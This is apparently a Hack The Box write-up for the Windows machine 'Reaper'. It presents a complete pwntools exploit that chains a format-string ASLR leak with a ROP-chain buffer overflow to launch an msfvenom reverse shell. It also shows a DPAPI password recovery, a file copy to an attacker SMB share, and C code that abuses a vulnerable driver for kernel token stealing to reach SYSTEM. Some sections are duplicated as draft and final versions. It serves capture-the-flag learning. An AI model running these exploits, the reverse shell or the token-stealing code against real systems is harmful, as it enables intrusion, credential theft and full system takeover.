![Reaper](/HTB-Portfolio/images/pwndreaper.png)
# HTB Reaper — Writeup
**Difficulty:** Insane  
**OS:** Windows  
**Author:** xct  
**Topics:** Windows Buffer Overflow, Format String Exploitation, ASLR Bypass, ROP Chain, DPAPI, Windows Kernel Exploitation, Token Stealing

---

## Overview

Reaper chains together multiple vulnerability classes to achieve full compromise:

1. **Enumeration** — Anonymous FTP exposes a custom Windows service binary
2. **Reverse Engineering** — Ghidra reveals a checksum algorithm, format string bug, and buffer overflow
3. **Format String Leak** — Defeats ASLR by leaking a runtime binary address
4. **ROP Chain + BOF** — Bypasses NX/DEP via `VirtualAlloc` to get a shell as `keysvc`
5. **DPAPI Decryption** — Recovers RDP credentials from an encrypted blob
6. **Kernel Exploitation** — Arbitrary kernel write via a vulnerable custom driver enables token stealing → SYSTEM

---

## Enumeration

### Nmap

```bash
nmap -sCV -Pn -p- 10.129.234.200 --min-rate 5000 -oA Reaper.nmap
```

Key findings:

| Port | Service | Notes |
|------|---------|-------|
| 21 | FTP (Microsoft ftpd) | Anonymous login allowed |
| 80 | HTTP (IIS 10.0) | Default IIS page, nothing interesting |
| 3389 | RDP | CN=reaper |
| 4141 | Custom service | Menu-driven key activation service |

### FTP — Anonymous Login

```bash
ftp 10.129.234.200
# Login: anonymous / (blank)
binary          # CRITICAL: must set binary mode or exe transfer corrupts
mget *
```

Two files retrieved:
- `dev_keys.txt` — three development license keys
- `dev_keysvc.exe` — the Windows binary running on port 4141

### dev_keys.txt

```
Development Keys:

100-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ==
101-FE9A1-550-A271-0109-UHJlbWl1bSBMaWNlbnNl
102-FE9A1-500-A272-0106-UHJlbWl1bSBMaWNlbnNl

The dev keys can not be activated yet, we are working on fixing a bug in the activation function.
```

Base64 tails decode to license type labels (`Standard License`, `Premium License`) — cosmetic only.

### Port 4141 — Key Service

```bash
nc 10.129.234.200 4141
```

```
Choose an option:
1. Set key
2. Activate key
3. Exit
```

Option 1 stores a key, option 2 activates it. Sending a dev key returns `Valid key format` but `Could not find key!` on activation — meaning the key passes format validation but isn't in the server-side `keys.txt` allowlist.

---

## Reverse Engineering — dev_keysvc.exe

### Initial Recon

```bash
strings dev_keysvc.exe | grep -iE "key|valid|activ|error|license|format"
```

Key strings found:
```
[Debug] Key too short!
[Debug] Invalid character (%d)!
[Debug] Checksum Provided: %d
[Debug] Checksum Calculated: %d
[Debug] Invalid checksum!
keys.txt
```

Binary protections (via winchecksec):
```
Dynamic Base : Present   (ASLR enabled)
NX           : Present   (DEP enabled)
GS           : Present   (stack cookies)
CFG          : NotPresent
```

### Ghidra — Key Validation Function

Load `dev_keysvc.exe` into Ghidra, run auto-analysis, then search defined strings for `"Invalid checksum"` → follow xref → lands in `FUN_140001760` (key validation).

**Key format structure** (0-indexed positions):

```
Pos:  0  1  2  3  4  5  6  7  8  9  10 11 12 13 14 15 16 17 18  19+
      X  X  X  -  X  X  X  X  X  -  X  X  X  -  X  X  X  X  -  CHECKSUM-COMMENT
```

Dashes required at positions 3, 9, 13, 18.

**Checksum algorithm** (decompiled):

```c
// Sum all non-dash characters at positions 0-17
// subtract 0x30 from each byte value
// result mod 10000 = 4-digit checksum

local_28 = 0;
while (local_18 < strlen(key)) {
    if (local_18 < 0x12 && key[local_18] != '-') {
        local_28 += (int)key[local_18] - 0x30;
    }
    local_18++;
}
checksum = local_28 % 10000;
// compare checksum to 4-digit integer parsed from position 19
```

### Checksum Verification Script

```python
def calc_checksum(prefix):
    # prefix = "XXX-XXXXX-XXX-XXXX"
    total = sum(ord(c) - 0x30 for c in prefix if c != '-')
    return total % 10000

prefix = "100-FE9A1-500-A270"
cs = calc_checksum(prefix)
print(f"Checksum: {cs}")          # 102 — matches dev key!
print(f"Full key: {prefix}-{cs:04d}")
```

Output confirms `0102` matches the first dev key exactly — checksum algorithm verified.

### Discovering the Format String Vulnerability

In the `log_key` function, the key is passed directly as the format string to `_snprintf`:

```c
_snprintf(key_string, 0xff2, (char *)key);  // key IS the format string
```

This means format specifiers in the key are interpreted. Sending `%p` leaks a stack pointer. Sending `%pX` (with `X` as a delimiter) leaks the address of the `"Checking key: "` string.

### Discovering the Buffer Overflow

The base64 comment section of the key (everything after position 19) has no length check. Sending a large cyclic pattern in that section and triggering Activate (option 2) crashes the service.

```bash
python3 -c "
from pwn import *
prefix = b'100-FE9A1-500-A270-0102-'
payload = prefix + cyclic(500)
print('1')
print(payload.decode())
print('2')
" | nc 10.129.234.200 4141
```

Connection drops — crash confirmed. The payload must be **base64-encoded** because raw binary bytes contain null bytes that terminate the string read prematurely.

**Offset to RIP: 88 bytes** (found via `pattern_offset.rb -q c9Ad`)

---

## Foothold — Shell as keysvc

### Attack Plan

1. **FSB leak** → defeat ASLR, get `pbase`
2. **BOF with ROP chain** → call `VirtualAlloc` to make stack RWX (note: `VirtualProtect` is NOT in the IAT, but `VirtualAlloc` is)
3. **Shellcode** → msfvenom reverse shell

### Why VirtualAlloc Instead of VirtualProtect?

`VirtualProtect` would be the standard choice to mark existing stack memory as executable, but it's not imported by this binary — there's no IAT entry to call it. `VirtualAlloc` with `flProtect=0x40` (PAGE_EXECUTE_READWRITE) allocates a new RWX region instead, which achieves the same result.

### The ROP Chain

Windows x64 calling convention passes arguments in RCX, RDX, R8, R9. Since we can't execute arbitrary code (NX), we chain existing gadgets from the binary to load each register:

```
VirtualAlloc(
    lpAddress  = RSP (current stack, via RSP→RCX gadget chain),
    dwSize     = 0x1000,
    flType     = 0x1000  (MEM_COMMIT),
    flProtect  = 0x40    (PAGE_EXECUTE_READWRITE)
)
→ push rsp; and al, 8; ret   (lands into NOP sled)
→ \x90 * 8
→ shellcode
```

### Exploit Script

```python
# vulnlab reaper exploit - macz 2023/08 (adapted)
from pwn import *
import base64
import subprocess

target_ip = "10.129.234.200"
listener_ip = "YOUR_TUN0_IP"
listener_port = 9001

log.info("generating shellcode...")
subprocess.check_output(
    f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={listener_ip} LPORT={listener_port} -f python -v sc -o sc.py",
    shell=True
)
from sc import *

p = remote(target_ip, 4141)

# --- Phase 1: FSB leak to defeat ASLR ---
# "Checking key: " is at offset 0x20660 from binary base
log.info("leaking program base...")
p.sendlineafter(b"Exit", b"1")
p.sendafter(b"Enter a key:", b"%pX-FE9A1-500-A270-0194-U3RhbmRhcmQgTGljZW5zZQ==")
# checksum for "%pX-FE9A1-500-A270" = 194
p.sendlineafter(b"Exit", b"2")
p.readuntil(b"Checking key: ")
leak = int(p.readuntil(b"X", drop=True).decode(), 16)
pbase = leak - 0x20660
log.info(f"leak:  {hex(leak)}")
log.info(f"pbase: {hex(pbase)}")

# --- Phase 2: ROP gadgets (relative offsets from binary base) ---
pop_rcx         = 0x00000000000031dc  # pop rcx; clc; ret
pop_rax         = 0x000000000000150a  # pop rax; ret
pop_r13         = 0x00000000000047b3  # pop r13; ret
mov_rdx_r13     = 0x000000000000368f  # mov rdx, r13; call rax
pop_rbx         = 0x00000000000020d9  # pop rbx; ret
mov_r9_rbx      = 0x0000000000001f90  # mov r9, rbx; mov r8, 0; add rsp, 8; ret
cmove_r9_rdx    = 0x000000000001f37d  # cmove r9, rdx; mov rax, r9; ret
mov_r8_0        = 0x0000000000001f93  # mov r8, 0; add rsp, 8; ret
add_r8_r9       = 0x0000000000003918  # add r8, r9; add rax, r8; ret
pop_rsi         = 0x0000000000004116  # pop rsi; ret
cmp_esi         = 0x0000000000012ddb  # cmp esi, 0x6348ffff; ret
jmp_qw_rbx      = 0x000000000001ec79  # jmp qword ptr [rbx]
pop_r12_rsi     = 0x000000000000a99a  # pop rsi; pop r12; ret

VirtualAlloc = pbase + 0x20000  # IAT entry

# Helper: load R8 with value
def load_r8(value):
    r  = p64(pbase + mov_r8_0)
    r += p64(0xdeadbeefdeadbeef)  # junk for add rsp, 8
    r += p64(pbase + pop_rbx)
    r += p64(value)
    r += p64(pbase + mov_r9_rbx)
    r += p64(0xdeadbeefdeadbeef)
    r += p64(pbase + add_r8_r9)
    return r

# Helper: load R9 with value
def load_r9(value):
    r  = p64(pbase + pop_rsi)
    r += p64(0x6348ffff)          # make cmove condition true
    r += p64(pbase + cmp_esi)
    r += p64(pbase + pop_r13)
    r += p64(value)
    r += p64(pbase + pop_rax)
    r += p64(pbase + pop_rax)
    r += p64(pbase + mov_rdx_r13)
    r += p64(pbase + cmove_r9_rdx)
    return r

# Helper: load RDX with value
def load_rdx(value):
    r  = p64(pbase + pop_r13)
    r += p64(value)
    r += p64(pbase + pop_rax)
    r += p64(pbase + pop_rax)     # fix call() side effect in mov_rdx_r13
    r += p64(pbase + mov_rdx_r13)
    return r

# Helper: RSP → RCX (lpAddress = current stack pointer)
def rsp_to_rcx():
    r  = p64(pbase + pop_rbx)
    r += p64(0)
    r += p64(pbase + 0x0000000000001fa0)  # xor rbx, rsp; ret
    r += p64(pbase + 0x0000000000001fc2)  # push rbx; pop rax; ret
    r += p64(pbase + 0x0000000000001f80)  # mov rcx, rax; ret
    return r

# Helper: jump through IAT entry
def jmp_IAT(address):
    r  = p64(pbase + pop_rbx)
    r += p64(address)
    r += p64(pbase + jmp_qw_rbx)
    r += p64(pbase + pop_r12_rsi)  # clean up stack after call
    r += p64(0xdeadbeefdeadbeef)
    r += p64(0xdeadbeefdeadbeef)
    return r

# --- Phase 3: Build full ROP chain ---
log.info("building rop chain...")
rop  = b""
rop += load_r8(0x1000)     # flAllocationType = MEM_COMMIT
rop += load_r9(0x40)       # flProtect = PAGE_EXECUTE_READWRITE
rop += load_rdx(0x1000)    # dwSize = one page
rop += rsp_to_rcx()        # lpAddress = current RSP
rop += jmp_IAT(VirtualAlloc)
rop += p64(pbase + 0x000000000001becd)  # push rsp; and al, 8; ret → land in shellcode
rop += b"\x90" * 8         # NOP sled
rop += sc                  # msfvenom reverse shell

# --- Phase 4: Send payload ---
# 88 bytes padding (cyclic) + ROP chain, base64-encoded
log.info("sending payload...")
p.sendlineafter(b"Exit", b"1")
payload = b"101-FE9A1-550-A271-0109-" + base64.b64encode(cyclic(88) + rop)
p.sendafter(b"Enter a key:", payload)

log.info("triggering exploit...")
p.sendlineafter(b"Exit", b"2")
p.interactive()
```

### Execution

```bash
# Terminal 1 — listener
rlwrap nc -lvnp 9001

# Terminal 2 — exploit
python3 exploit.py
```

**Result:** Reverse shell as `reaper\keysvc`

```
C:\keysvc> whoami
reaper\keysvc
```

### User Flag

```
C:\Users\keysvc\Desktop\user.txt
```

---

## Lateral Movement — DPAPI Credential Decryption

After getting a shell, enumerate the user's home directory:

```powershell
type C:\Users\keysvc\automation.txt
# 01000000d08c9ddf0115d1118c7a00c04fc297eb...
```

This is a **DPAPI blob** — encrypted with the current user's master key, decryptable only in the context of that user's session. Since we're running as `keysvc`, we can decrypt it directly:

```powershell
$DPAPI_blob = Get-Content C:\Users\keysvc\automation.txt | ConvertTo-SecureString
$decrypted = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($DPAPI_blob)
[System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($decrypted)
# CatWinterMist10
```

**Credentials recovered:** `keysvc:CatWinterMist10`

### RDP Access

```bash
xfreerdp3 /u:keysvc /p:CatWinterMist10 /v:10.129.234.200 +clipboard /cert:ignore
```

---

## Privilege Escalation — Kernel Exploitation (reaper.sys)

*In progress...*

---

## Credentials Summary

| Username | Password / Hash | Method |
|----------|----------------|--------|
| keysvc | (shell via exploit) | BOF + ROP |
| keysvc | CatWinterMist10 | DPAPI decryption |

## Flags

| Flag | Value |
|------|-------|
| User | `0865b92bd519f7a49e2fa62e2eaf9f85` |
| Root | TBD |

---

## Privilege Escalation — Kernel Exploitation (reaper.sys)

### Enumerating the Driver

```powershell
# Confirm driver is loaded and running
driverquery /v | findstr reaper
# reaper  Kernel  Auto  Running  \??\C:\driver\reaper.sys
```

### Exfiltrating reaper.sys

```bash
# Attacker machine
sudo impacket-smbserver -smb2support share .
```

```powershell
# Target (RDP session)
copy-item C:\driver\reaper.sys \\ATTACKER_IP\share\
```

### Reversing the Driver — IRP_MJ_DEVICE_CONTROL

Load `reaper.sys` into Ghidra. Navigate: `DriverEntry` → `MajorFunction[0xe]` assignment → `FUN_140001020`.

Three IOCTL handlers identified:

**IOCTL 0x80002003 — Allocate pool:**
```c
// Requires magic value 0x6a55cc9e
// Allocates 0x20-byte pool, copies user struct into it:
//   [0]  = magic
//   [1]  = thread_id
//   [2]  = priority
//   [4]  = src_address  (QWORD)
//   [6]  = dst_address  (QWORD)
DAT_140003050 = ExAllocatePoolWithTag(0, 0x20, 0x70616552);
```

**IOCTL 0x80002007 — Free pool:**
```c
ExFreePoolWithTag(DAT_140003050, 0x70616552);
```

**IOCTL 0x8000200b — Copy (the vulnerability):**
```c
// Arbitrary 8-byte kernel write — NO validation
**(undefined8 **)(DAT_140003050 + 6) = **(undefined8 **)(DAT_140003050 + 4);
// i.e.: *(dst_address) = *(src_address)
```

The Copy IOCTL blindly dereferences both src and dst pointers and copies 8 bytes. Combined with Allocate, this gives a full **arbitrary kernel read/write** primitive.

### Token Stealing Strategy

Every Windows process has an `_EPROCESS` structure in kernel memory. At offset `0x4b8` is a pointer to the process **Token** — this determines privileges. The exploit:

1. Leaks the kernel address of `System _EPROCESS` via `NtQuerySystemInformation`
2. Walks `ActiveProcessLinks` (circular doubly-linked list at `+0x448`) to find our process and SYSTEM (PID 4)
3. Overwrites our token pointer with SYSTEM's token pointer using the arbitrary write primitive
4. Spawns `cmd.exe` — now inherits `NT AUTHORITY\SYSTEM` privileges

### _EPROCESS Offsets (Windows 10 19045)

| Field | Offset |
|-------|--------|
| UniqueProcessId | 0x440 |
| ActiveProcessLinks | 0x448 |
| Token | 0x4b8 |

### Kernel Exploit (priv.c)

```c
// Arbitrary read: dereference kernel pointer via IOCTL chain
QWORD arbRead(QWORD where) {
    reap ioctl;
    QWORD output;
    ioctl.magic       = 0x6A55CC9E;
    ioctl.thread_id   = GetCurrentThreadId();
    ioctl.priority    = 0;
    ioctl.src_address = where;
    ioctl.dst_address = (QWORD)&output;  // write result to our userland buffer
    Allocate(hFile, &ioctl);
    Copy(hFile);   // *(dst) = *(src) — reads kernel memory into output
    Free(hFile);
    return output;
}

// Arbitrary write: write 8 bytes to kernel address
void arbWrite(QWORD dst, QWORD src) {
    reap ioctl;
    ioctl.magic       = 0x6A55CC9E;
    ioctl.thread_id   = GetCurrentThreadId();
    ioctl.priority    = 0;
    ioctl.src_address = src;   // pointer to our value
    ioctl.dst_address = dst;   // kernel address to overwrite
    Allocate(hFile, &ioctl);
    Copy(hFile);
    Free(hFile);
}

// In main():
eProcResult result    = GetEProcessByPid(GetCurrentProcessId());
eProcResult sysresult = GetEProcessByPid(4);  // SYSTEM = PID 4

// Overwrite our token with SYSTEM's token
arbWrite(result.eProcess + 0x4b8, sysresult.eProcess + 0x4b8);
system("cmd.exe");  // spawns as NT AUTHORITY\SYSTEM
```

### Compilation

```bash
x86_64-w64-mingw32-gcc -o exploit.exe priv.c -lpsapi
```

### Execution

Transfer `exploit.exe` to target via SMB, then run from RDP session:

```
C:\Users\keysvc\Desktop\exploit.exe

[+] Getting Device Driver Handle
[+] Device Handle: 0x00000000000000b8
[>] System _EPROCESS: 0xffff9c0d4dc92080
[>] Found Process: ffff9c0d54bd5080 (PID: 5556, TOKEN_PTR: ffffb0092fa9d064)
[>] Found Process: ffff9c0d4dc92080 (PID: 4,    TOKEN_PTR: ffffb0092920f045)
[+] Copying SYSTEM token to current process...
[+] Spawning SYSTEM shell...

C:\Users\keysvc> whoami
nt authority\system
```

### Root Flag

```
C:\Users\Administrator\Desktop\root.txt
```

---

## Credentials Summary

| Username | Password | Method |
|----------|----------|--------|
| keysvc | (shell via BOF+ROP) | Format string leak + buffer overflow |
| keysvc | CatWinterMist10 | DPAPI blob decryption |
| SYSTEM | — | Kernel token stealing via reaper.sys |

## Flags

| Flag | Value |
|------|-------|
| User | `0865b92bd519f7a49e2fa62e2eaf9f85` |
| Root | `31d581fcb01ee32812ad913b7d7ed5cd` |
